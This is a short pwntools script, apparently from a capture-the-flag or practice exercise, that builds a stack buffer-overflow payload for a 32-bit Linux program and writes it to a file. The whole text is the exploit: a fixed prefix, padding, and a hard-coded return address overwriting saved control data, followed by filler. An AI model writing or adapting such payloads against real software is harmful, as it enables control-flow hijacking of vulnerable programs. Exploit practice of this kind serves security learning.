from pwn import *
context.arch='i386'
context.os='linux'
ret_addr = 0x565562ad 
addr = p32(ret_addr, endian='little')
print(addr)
payload = b"711626830" + b"A"*3 + addr + b"A"*1008
print(len(payload))
with open("./shellcode_payload2", "wb") as f:
	f.write(payload)